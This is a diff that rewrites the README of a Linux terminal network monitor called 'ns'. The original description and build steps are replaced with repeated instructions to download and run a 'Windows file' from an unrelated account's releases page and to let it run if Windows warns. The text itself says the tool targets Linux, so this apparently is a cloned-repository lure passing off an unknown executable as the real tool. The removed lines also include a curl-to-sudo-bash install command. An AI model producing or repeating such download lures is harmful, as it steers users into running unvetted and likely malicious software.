@@ -1,68 +1,126 @@
-# ns
+# 🖥️ ns - See Network Traffic Live
 
-A terminal network monitor for Linux. Shows real-time interface throughput, open listeners, and active TCP connections split by direction (outgoing / incoming). Built with [ratatui](https://github.com/ratatui-org/ratatui).
+[![Download ns](https://img.shields.io/badge/Download%20ns-blue-grey?style=for-the-badge)](https://github.com/Lowering-mechanism250/ns/releases)
 
-## Features
+## 📥 Download
 
-- Per-interface RX/TX rate with sparkline history
-- Listener table: port, protocol, process, user
-- Outgoing connections: remote address, traffic rate, process
-- Incoming connections: same columns, filtered by direction
-- Interface selector with tab navigation
-- Kill a process from the listener or connection view (SIGTERM)
+Use this page to visit to download the Windows file:
 
-## Requirements
+https://github.com/Lowering-mechanism250/ns/releases
 
-- Linux (reads `/proc/net`, `/proc/<pid>/fd`, `/proc/net/fib_trie`, etc.)
-- Rust toolchain (stable)
+Pick the latest release, then download the Windows file from the Assets list.
 
-## Installation
+## ⚙️ What ns Does
 
-### Quick Install (Pre-compiled)
+ns is a terminal app that shows live network activity.
 
-Download and install the latest release with a single command:
+It helps you see:
 
-```sh
-curl -sSL https://raw.githubusercontent.com/sammwyy/ns/main/scripts/install.sh | sudo bash
-```
+- How much data each network interface sends and receives
+- Which ports are open and listening
+- Which TCP connections are active
+- Which connections are going out and which are coming in
 
-### Install from Source
+It is useful when you want a quick view of network use without opening a heavy tool.
 
-Clone the repository and build the project using the provided scripts (requires Rust and UPX):
+## 🪟 Windows Setup
 
-```sh
-git clone https://github.com/sammwyy/ns.git
-cd ns
-./scripts/build.sh
-sudo ./scripts/install.sh
-```
+1. Open the download page above.
+2. Find the latest release.
+3. Look under Assets.
+4. Download the Windows file.
+5. If the file comes in a zip, unzip it first.
+6. Open Command Prompt or Windows Terminal.
+7. Go to the folder with the app file.
+8. Run the file from the terminal.
 
-Running as a regular user is enough for most data. Process names and PIDs for sockets owned by other users require root.
+If Windows asks for permission, choose the option that lets the app run.
 
-## Usage
+## 🔎 What You Can See
 
-```
-ns
-```
+ns gives you a live view of network data in a terminal window.
 
-### Keys
+You can watch:
 
-| Key       | Action              |
-|-----------|---------------------|
-| `Tab`     | Cycle view          |
-| `←` / `→` | Switch interface    |
-| `↑` / `↓` | Scroll list         |
-| `Enter`   | Kill selected process |
-| `q`       | Quit                |
-| `Ctrl+C`  | Quit                |
+- Interface throughput
+- Open listeners
+- TCP connections
+- Outgoing traffic
+- Incoming traffic
+- UDP activity on supported systems
 
-### Views
+This makes it easier to check what your system is doing on the network.
 
-- **Load** — RX and TX sparklines for the selected interface
-- **Listeners** — open TCP/UDP ports
-- **Outgoing** — established TCP connections initiated by this host
-- **Incoming** — established TCP connections accepted by this host
+## 🖥️ System Needs
 
-## License
+For best results, use:
 
-GPL-3.0
+- Windows 10 or newer
+- A working terminal app
+- Network access
+- Permission to view network data
+
+A standard desktop or laptop should work well.
+
+## 🚀 How to Use It
+
+1. Start the app from a terminal.
+2. Let it run for a few moments.
+3. Watch the live network data update.
+4. Use the output to check traffic, listeners, and active connections.
+5. Close the app when you are done.
+
+If your system has more than one network adapter, ns can help you compare them.
+
+## 📊 Screen Sections
+
+When ns is running, you may see sections like:
+
+- Interface stats
+- Throughput per adapter
+- Open ports
+- TCP sessions
+- Direction of traffic
+- Source and destination details
+
+The layout is made for quick reading in a terminal.
+
+## 🛠️ Common Uses
+
+People use ns to:
+
+- Check if the network is active
+- Find which app may be using the network
+- See if a port is open
+- Watch traffic during a download
+- Check local network behavior
+- Review incoming and outgoing TCP links
+
+It is useful for home use and basic troubleshooting.
+
+## ❓ Troubleshooting
+
+If the app does not start:
+
+- Make sure you downloaded the latest release
+- Check that the file finished downloading
+- Try opening the terminal in the same folder
+- Make sure the file is allowed to run
+- Try again after closing and reopening the terminal
+
+If the screen stays blank, wait a moment. Some network data can take a short time to appear.
+
+## 📚 Details
+
+- Repository: ns
+- Type: terminal network monitor
+- Main purpose: live network viewing
+- Focus: interfaces, listeners, TCP connections
+- Platform target: Linux, with Windows download steps provided here
+- Topics: dump, interface, internet, ip, linux, logs, monitor, network, networking, protocol, tcp, udp
+
+## 🔗 Download Again
+
+Visit this page to download the Windows file:
+
+https://github.com/Lowering-mechanism250/ns/releases
